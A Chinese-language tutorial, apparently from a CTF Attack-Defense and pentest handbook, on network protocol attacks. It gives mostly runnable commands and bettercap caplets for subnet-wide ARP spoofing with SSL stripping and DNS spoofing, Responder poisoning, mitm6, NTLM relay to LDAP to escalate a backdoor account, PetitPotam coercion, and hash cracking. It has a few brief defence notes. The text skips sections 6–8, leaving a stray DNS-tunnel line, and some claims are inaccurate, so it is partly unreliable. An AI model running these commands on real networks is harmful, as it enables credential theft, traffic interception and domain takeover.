# 网络协议攻击

## 1. 概述

网络协议攻击是渗透测试和CTF Attack-Defense中的重要攻击向量。利用ARP欺骗、DNS投毒、LLMNR/NBT-NS投毒、DHCPv6攻击、中间人攻击等网络层技术，攻击者可以在内网中捕获凭据、劫持流量、实施重放攻击。在CTF A/D模式中，攻击者部署这些技术后可以被动收集其他队伍访问你的网络时暴露的凭据，或在网络层面实现反制。

## 2. 核心原理

### 2.1 协议攻击矩阵

```
网络层:
├── ARP欺骗 (L2)
│   ├── 单向欺骗 → 中间人
│   └── 双向欺骗 → 中间人 + 流量透明转发
├── IPv6攻击 (L3)
│   ├── DHCPv6投毒 → 设置恶意DNS
│   └── RA欺骗 → 路由重定向
└── ICMP攻击 (L3)
    └── 重定向 → 路由劫持

名字解析层:
├── LLMNR投毒 (Windows多播DNS替代)
├── NBT-NS投毒 (NetBIOS名字服务)
├── mDNS投毒 (Linux/Apple)
└── DNS投毒 → 域名劫持

应用层:
├── WPAD (Web Proxy Auto-Discovery)
├── SMB中继 (NTLM中继攻击)
├── HTTP中继
└── RDP中间人
```

### 2.2 攻击场景分类

```
1. 被动捕获（不修改网络流量）
   ├── Responder监听LLMNR/NBT-NS/mDNS广播
   ├── DHCPv6 DNS配置投毒
   └── ARP嗅探

2. 主动中间人（修改网络流量）
   ├── ARP欺骗 + 流量转发
   ├── WPAD劫持
   └── DNS劫持 + 伪造响应

3. 中继攻击（重放认证流量）
   ├── NTLM中继到SMB
   ├── NTLM中继到LDAP
   └── NTLM中继到HTTP/OWA
```

## 3. ARP欺骗攻击

### 3.1 ARP协议基础

```
正常ARP流程:
Host_A 广播: "谁是 192.168.1.1? 告诉 192.168.1.100"
Gateway 单播: "192.168.1.1 是 aa:bb:cc:dd:ee:ff"

ARP欺骗:
攻击者持续发送伪造的ARP应答:
"192.168.1.1 是 攻击者_MAC"
"192.168.1.100 是 攻击者_MAC"
→ 受害者和网关的流量都经过攻击者 → MITM
```

### 3.2 Bettercap — 综合网络攻击框架

```bash
# === 安装 ===
sudo apt install bettercap
# 或从源码编译
git clone https://github.com/bettercap/bettercap.git

# === Bettercap基础操作 ===
sudo bettercap -iface eth0

# 交互式命令
net.show              # 列出网络中的所有主机
net.probe on          # 发送探测包发现隐藏主机
net.sniff on          # 开始嗅探
net.sniff off         # 停止嗅探

# === ARP欺骗 ===
# 对整个子网进行ARP欺骗
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# 对特定目标
set arp.spoof.targets 192.168.1.5,192.168.1.10
arp.spoof on

# 完全模式（双向欺骗）
set arp.spoof.internal true
arp.spoof on

# === HTTP/HTTPS嗅探 ===
# 在Bettercap中启用HTTP代理
set http.proxy.sslstrip true  # SSL剥离（HTTPS→HTTP降级攻击）
http.proxy on

# 捕获HTTP POST数据（包括登录表单）
net.sniff on

# === DNS欺骗 ===
set dns.spoof.domains target.com,*.target.com
dns.spoof on
# 当受害者访问target.com时被重定向到攻击机IP

# === Bettercap Caplet (自动化脚本) ===
# 创建 full-mitm.cap:
cat << 'EOF' > /tmp/full-mitm.cap
# 全功能中间人攻击脚本
net.probe on
sleep 5

# ARP欺骗整个子网
set arp.spoof.targets 192.168.1.0/24
set arp.spoof.internal true
arp.spoof on

# SSL剥离
set http.proxy.sslstrip true
http.proxy on

# DNS欺骗
set dns.spoof.domains *.google.com,*.microsoft.com
dns.spoof on

# 启用嗅探
net.sniff on

# 启动凭证收集
events.stream on
EOF

# 执行caplet
sudo bettercap -iface eth0 -caplet /tmp/full-mitm.cap

# === Bettercap凭据捕获 ===
# 自动识别并显示各种协议的凭证
# - HTTP Basic Auth
# - HTTP POST表单
# - FTP/Telnet明文密码
# - NTLMv1/v2哈希

# === ARP欺骗防护检测 ===
# 检测你是否被ARP欺骗（A/D防御）
# 方法1: 检查ARP表是否有重复MAC
arp -a | awk '{print $4}' | sort | uniq -d
# 如果同一MAC出现在多个IP → 可能存在欺骗

# 方法2: 使用arpwatch
arpwatch -i eth0

# 方法3: 使用XArp (Windows)
```

### 3.3 arpspoof (经典工具)

```bash
# === 安装 ===
sudo apt install dsniff

# === 基础ARP欺骗 ===
# 欺骗受害者认为攻击机是网关
arpspoof -i eth0 -t 192.168.1.5 192.168.1.1

# 欺骗网关认为攻击机是受害者（双向）
arpspoof -i eth0 -t 192.168.1.1 192.168.1.5

# 同时运行（两个终端）
# Terminal 1:
arpspoof -i eth0 -t 192.168.1.5 192.168.1.1
# Terminal 2:
arpspoof -i eth0 -t 192.168.1.1 192.168.1.5

# === 开启IP转发 ===
# 必须启用IP转发，否则受害者网络中断（导致拒绝服务）
echo 1 > /proc/sys/net/ipv4/ip_forward
# 持久化
sysctl -w net.ipv4.ip_forward=1

# 配置iptables允许转发
iptables -A FORWARD -i eth0 -o eth0 -j ACCEPT
iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT

# === 结合其他工具 ===
# arpspoof + urlsnarf (嗅探HTTP URL)
urlsnarf -i eth0

# arpspoof + driftnet (捕获图片)
driftnet -i eth0

# arpspoof + tcpdump (全流量捕获)
tcpdump -i eth0 -w mitm_capture.pcap
```

## 4. LLMNR/NBT-NS/mDNS投毒

### 4.1 Responder

Responder是内网渗透中最广泛使用的LLMNR/NBT-NS/mDNS投毒工具。当Windows主机无法通过DNS解析名称时，会回退到广播LLMNR和NBT-NS查询——Responder通过响应这些查询来捕获NTLM哈希。

```bash
# === 安装 ===
sudo apt install responder
# 或从源码
git clone https://github.com/lgandx/Responder.git

# === 基础使用 ===
# 监听模式（默认）
sudo responder -I eth0

# 更激进的模式
sudo responder -I eth0 -A   # 分析模式（被动）
sudo responder -I eth0 -wF  # 开启WPAD和强制认证

# === 重要选项 ===
sudo responder -I eth0 -v   # 详细输出
sudo responder -I eth0 -b   # 返回基本HTTP认证
sudo responder -I eth0 -d   # 启用DHCP投毒
sudo responder -I eth0 -r   # 启用NetBIOS重定向
sudo responder -I eth0 -P   # 强制NTLMv1（容易破解）

# === Responder输出 ===
# 日志文件位置：
# /usr/share/responder/logs/
# 包含:
# SMB-NTLMv2-SSP-10.10.10.5.txt    # NTLMv2挑战-应答哈希
# HTTP-NTLMv2-10.10.10.10.txt
# LDAP-Clear-...txt                # 如果获得明文
# Poisoners-Session.log

# === Responder配置文件 ===
# /etc/responder/Responder.conf
# 关键配置:
# SQL = On    → 假冒SQL Server认证
# SMB = On    → 假冒SMB服务器
# HTTP = On   → 假冒HTTP认证
# FTP = On    → 假冒FTP服务器
# LDAP = On   → 假冒LDAP认证
# POP = On    → 假冒POP3邮件认证
# SMTP = On   → 假冒SMTP认证
# IMAP = On   → 假冒IMAP认证

# === WPAD劫持 (Web Proxy Auto-Discovery) ===
# 当浏览器配置"自动检测设置"时会通过WPAD查询代理配置
# Responder可以响应WPAD查询并提供PAC文件
sudo responder -I eth0 -w On
# WPAD服务器默认在攻击机的80端口
# 受害者浏览器会使用攻击机作为代理
# → 所有HTTP流量经过攻击机 → 可能捕获明文凭据

# === 破解Responder捕获的哈希 ===
# Net-NTLMv2哈希格式
hashcat -m 5600 Responder-Session.log /usr/share/wordlists/rockyou.txt

# 或者用john
john --format=netntlmv2 Responder-Session.log

# === Responder + ntlmrelayx联动 ===
# 同时运行中继攻击
# Terminal 1: Responder (仅监听HTTP/HTTPS，关闭SMB)
sudo responder -I eth0 --lm --disable-ess
# 修改 Responder.conf 关闭 SMB=Off, HTTP=Off

# Terminal 2: ntlmrelayx
sudo impacket-ntlmrelayx -t 192.168.1.10 -smb2support

# 也可以中继到LDAP添加用户
sudo impacket-ntlmrelayx -t ldap://192.168.1.10 --escalate-user attacker_user

# 中继到多个协议
sudo impacket-ntlmrelayx -tf targets.txt -l /tmp/loot --dump-laps
```

## 5. DHCPv6攻击

### 5.1 DHCPv6 DNS劫持（mitm6）

DHCPv6攻击利用IPv6优先于IPv4的机制，伪造DHCPv6服务器为受害者分配IPv6地址和DNS服务器，从而劫持DNS流量。

```bash
# === 安装mitm6 ===
pip3 install mitm6
# 或
git clone https://github.com/dirkjanm/mitm6.git

# === 基础mitm6攻击 ===
# 在攻击机上运行DHCPv6服务器
sudo mitm6 -d domain.local

# 指定攻击机IPv6地址和DNS域名
sudo mitm6 -i eth0 -d domain.local --debug

# === mitm6 + ntlmrelayx 联动 ===
# 最强大的组合: mitm6劫持DNS → 受害者访问WPAD → NTLM中继

# Terminal 1: mitm6
sudo mitm6 -d domain.local

# Terminal 2: ntlmrelayx中继到LDAPS
sudo ntlmrelayx -t ldaps://DC_IP -wh attacker-wpad --delegate-access --no-dump

# 或中继到SMB
sudo ntlmrelayx -t smb://DC_IP -smb2support -socks

# 中继到HTTP（添加RBCD）
sudo ntlmrelayx -t ldaps://dc.domain.local --delegate-access --escalate-user attacker_account

# 攻击效果：
# 1. mitm6为受害者分配IPv6 DNS → 攻击机
# 2. 受害者查询wpad.domain.local → 被引导到攻击机
# 3. 受害者尝试WPAD认证 → NTLM认证发给攻击机
# 4. ntlmrelayx将NTLM认证中继到DC → 创建计算机账户/配置委派

# === 防护与检测 ===
# 1. 阻止IPv6流量（如果环境不需要IPv6）
# 2. 在交换机上启用RA Guard
# 3. 监控DHCPv6服务器出现事件
# 4. 确保LDAPS签名和EPA
```

```bash
iodined -f -c -P password 10.0.0.1 tunnel.domain.com
```

## 9. 实战示例

### 9.1 内网凭据捕获完整链

**场景：** CTF A/D比赛中，攻击机在内网中，需要尽可能多地捕获其他队伍的NTLM哈希。

```bash
# === 阶段1: 部署Responder（被动捕获） ===
# 修改Responder配置以最大化捕获
# 编辑 /etc/responder/Responder.conf
vim /etc/responder/Responder.conf
# 确保 SMB=On, HTTP=On, HTTPS=On, WPAD=Off(先用被动)

# 启动Responder
sudo responder -I eth0 -v
# 输出日志到文件
# 等待广播查询...

# === 阶段2: 主动中间人 ===
# 如果被动捕获不足，使用Bettercap进行ARP欺骗

# 创建Bettercap caplet
cat << 'EOF' > /tmp/ctf_mitm.cap
# CTF A/D MITM
net.probe on
sleep 3

# ARP欺骗整个比赛网络
set arp.spoof.targets 10.0.0.0/24
set arp.spoof.internal true
arp.spoof on

# 启用HTTP代理嗅探
set http.proxy.sslstrip true
http.proxy on

# 记录所有流量
net.sniff on

# 提取凭证
events.stream on
EOF

sudo bettercap -iface eth0 -caplet /tmp/ctf_mitm.cap

# === 阶段3: 中继捕获的哈希 ===
# Terminal 1: 关闭Responder的SMB/HTTP，仅保持监听
# Terminal 2: 启动ntlmrelayx
sudo ntlmrelayx -tf targets.txt -smb2support -of captured_hashes.txt

# 如果获取了计算机账户的认证
# 中继到LDAP添加后门
sudo ntlmrelayx -t ldap://10.0.0.10 --escalate-user backdoor_svc

# === 阶段4: 破解捕获的哈希 ===
# 从Responder日志提取哈希
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt | tee all_ntlmv2.txt

# 从Bettercap提取哈希
cat /root/bettercap-events.log | grep -A5 "NTLMv2" | tee -a all_ntlmv2.txt

# 破解
hashcat -m 5600 all_ntlmv2.txt /usr/share/wordlists/rockyou.txt --force

# === 阶段5: 针对性强制认证 ===
# 如果某些目标没有主动触发认证
# 使用PetitPotam或其他强制认证技术
python3 PetitPotam.py 10.0.0.100 10.0.0.15  # 攻击机IP 目标IP

# 同时监听
sudo ntlmrelayx -t smb://10.0.0.15 -smb2support -c "whoami"

# === 阶段6: 利用WPAD ===
# 启用Responder的WPAD
sudo responder -I eth0 -wF

# 或使用mitm6 + ntlmrelayx
```

## 10. 常见误区与注意事项

- **误区1：ARP欺骗忘记开启IP转发。** 这会导致受害者完全断网（拒绝服务），立即暴露攻击。务必：`echo 1 > /proc/sys/net/ipv4/ip_forward`。
- **误区2：在Restricted Admin环境浪费中继。** 如果目标WinRM启用了Restricted Admin模式，Net-NTLMv2中继意义不大（仍需密码）。
- **误区3：Responder和ntlmrelayx同时运行在重叠端口。** 默认都监听445(SMB)，需要让Responder关闭SMB或将ntlmrelayx改为其他端口。
- **误区4：没有合适的目标就运行中继。** 确保reay目标已确认SMB签名未开启，否则时间浪费。
- **注意：LLMNR/NBT-NS投毒在子网内有效，跨网段不工作。**
- **注意：一些安全产品（如Microsoft LAPS）会记录凭证，滥用会被检测到。**
- **注意：多层交换环境（Managed Switch）可能有防范（DHCP Snooping, Dynamic ARP Inspection）。**
